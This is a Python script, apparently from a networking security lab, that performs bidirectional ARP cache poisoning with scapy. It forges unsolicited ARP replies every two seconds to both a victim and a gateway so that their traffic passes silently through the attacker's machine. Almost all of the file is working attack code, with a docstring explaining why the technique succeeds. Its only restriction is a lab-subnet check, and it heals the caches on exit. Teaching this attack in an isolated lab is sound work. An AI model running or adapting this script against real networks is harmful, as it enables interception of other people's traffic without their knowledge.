#!/usr/bin/env python3
"""
attacker/arp_spoof.py
=====================

Step 2 of the attack chain — bidirectional ARP cache poisoning.

What we do
----------
We continuously send two lies on a 2-second loop:

    To the victim  :  "the gateway (192.168.56.1)  is at MY MAC"
    To the gateway :  "the victim  (192.168.56.101) is at MY MAC"

After the first wave both kernels update their ARP caches, and every
packet they would have sent directly to each other now arrives at us
instead.  Because we have `net.ipv4.ip_forward=1` set, we silently
relay those packets onward — they reach their real destination, the
TCP connections succeed, and neither side sees anything wrong at the
application layer.  That is what makes ARP MITM so dangerous in the
real world: zero user-visible symptoms.

Why op=2 (is-at) instead of op=1 (who-has)?
-------------------------------------------
op=1 is a *question* ("who has 192.168.56.1?").  op=2 is an *answer*
("192.168.56.1 is at xx:xx:xx:xx:xx:xx").  RFC 826 says hosts may
accept op=2 replies even when they never sent the question — this is
the "gratuitous ARP" mechanism originally designed for handover
between HA pairs.  Most kernels honour it, which is the entire reason
this attack still works in 2026.

Why 2 seconds?
--------------
The Linux ARP cache entry timeout is ~60s.  Refreshing every 2s is
*massively* faster than the natural expiry, so even if the victim
broadcasts a who-has during a quiet moment, our forged answer almost
always arrives first.

Safety
------
* Refuses to run if either IP is outside 192.168.56.0/24 (lab fuse).
* Registers an atexit handler AND a SIGINT handler that triggers
  cleanup.py-equivalent healing before the script terminates.  Even
  if the instructor `Ctrl-C`'s in a panic the caches get repaired.
"""

from __future__ import annotations

import argparse
import atexit
import signal
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from shared import config, colors                       # noqa: E402
from shared.network_utils import (                      # noqa: E402
    assert_lab_network, require_root, arp_lookup, get_iface_mac,
)

try:
    from scapy.all import ARP, Ether, sendp             # type: ignore
except ImportError:
    colors.die("scapy is required: pip3 install scapy")


# A thread-safe "please stop" flag.  The poisoning loop checks it on
# every iteration so Ctrl-C is honoured promptly.
_stop_event = threading.Event()


def build_poison(target_ip: str,
                 target_mac: str,
                 impersonated_ip: str,
                 attacker_mac: str) -> "Ether":
    """
    Build one poison packet.

    psrc  = the IP we are claiming to own (the impersonated host)
    hwsrc = our REAL MAC — that's the lie: we say "I own that IP"
    pdst  = the host receiving the lie
    hwdst = the receiver's MAC (so the frame is unicast L2 too)
    op=2  = unsolicited "is-at" reply (see module docstring)
    """
    return (
        Ether(src=attacker_mac, dst=target_mac)
        / ARP(
            op=2,
            psrc=impersonated_ip,
            hwsrc=attacker_mac,
            pdst=target_ip,
            hwdst=target_mac,
        )
    )


def build_heal(claimed_ip: str,
               claimed_mac: str,
               target_ip: str,
               target_mac: str) -> "Ether":
    """Truthful op=2 reply — used in the cleanup path on exit."""
    return (
        Ether(src=claimed_mac, dst=target_mac)
        / ARP(op=2,
              psrc=claimed_ip, hwsrc=claimed_mac,
              pdst=target_ip,  hwdst=target_mac)
    )


def poison_loop(args: argparse.Namespace,
                victim_mac: str,
                gateway_mac: str,
                attacker_mac: str) -> None:
    """Send the two poison packets every <interval> seconds, forever."""
    pkt_to_victim = build_poison(
        target_ip=args.victim,  target_mac=victim_mac,
        impersonated_ip=args.gateway, attacker_mac=attacker_mac,
    )
    pkt_to_gateway = build_poison(
        target_ip=args.gateway, target_mac=gateway_mac,
        impersonated_ip=args.victim,  attacker_mac=attacker_mac,
    )

    sent = 0
    while not _stop_event.is_set():
        sendp(pkt_to_victim,  iface=args.iface, verbose=False)
        sendp(pkt_to_gateway, iface=args.iface, verbose=False)
        sent += 2
        colors.info(f"Poisoned (total packets sent: {sent})")
        # Use the Event's wait() not time.sleep() so we can be woken up
        # instantly when the user hits Ctrl-C.
        _stop_event.wait(args.interval)


def heal_caches(args: argparse.Namespace,
                victim_mac: str,
                gateway_mac: str) -> None:
    """Send several waves of TRUE ARP replies to undo the damage."""
    colors.step("Cleanup: re-broadcasting true ARP bindings")
    fix_victim  = build_heal(args.gateway, gateway_mac,
                             args.victim,  victim_mac)
    fix_gateway = build_heal(args.victim,  victim_mac,
                             args.gateway, gateway_mac)
    for n in range(1, 6):
        try:
            sendp(fix_victim,  iface=args.iface, verbose=False)
            sendp(fix_gateway, iface=args.iface, verbose=False)
            colors.ok(f"Healing wave {n}/5")
        except Exception as exc:
            colors.warn(f"Healing send failed: {exc}")
        time.sleep(0.5)
    colors.ok("Cleanup complete — verify on victim: `ip neigh show`")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Bidirectional ARP cache poisoning (Module 5 lab).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--victim",   default=config.VICTIM_IP)
    p.add_argument("--gateway",  default=config.GATEWAY_IP)
    p.add_argument("--iface",    default=config.DEFAULT_IFACE)
    p.add_argument("--interval", type=float,
                   default=config.ARP_POISON_INTERVAL_SEC,
                   help="Seconds between poison-packet waves")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    colors.banner("attacker/arp_spoof.py", role="ATTACKER / ARP POISONER")

    assert_lab_network(args.victim)
    assert_lab_network(args.gateway)
    require_root("attacker/arp_spoof.py")

    # ----- recon for real MACs (so cleanup can heal accurately) -----
    colors.step("Recon: resolving real MACs before we lie")
    victim_mac  = arp_lookup(args.victim,  iface=args.iface)
    gateway_mac = arp_lookup(args.gateway, iface=args.iface)
    if not victim_mac or not gateway_mac:
        colors.die("Could not resolve one of the real MACs — aborting.")
    attacker_mac = get_iface_mac(args.iface)
    if not attacker_mac:
        colors.die(f"Could not read MAC of {args.iface}")
    colors.ok(f"victim   = {args.victim}  -> {victim_mac}")
    colors.ok(f"gateway  = {args.gateway} -> {gateway_mac}")
    colors.ok(f"attacker = {args.iface}   -> {attacker_mac}")

    # ----- register the safety nets BEFORE we start lying -----
    # atexit fires on normal interpreter shutdown.
    atexit.register(heal_caches, args, victim_mac, gateway_mac)

    # SIGINT (Ctrl-C) / SIGTERM should also trigger a clean exit so
    # the atexit handler runs.  We just set the stop event and let
    # main() fall through naturally.
    def _signal_handler(signum, _frame):
        colors.warn(f"Caught signal {signum} — stopping poisoner")
        _stop_event.set()
    signal.signal(signal.SIGINT,  _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    colors.step(f"Poisoning every {args.interval}s — Ctrl-C to stop & heal")
    poison_loop(args, victim_mac, gateway_mac, attacker_mac)
    colors.info("Poisoner stopped; atexit will now heal caches.")


if __name__ == "__main__":
    main()
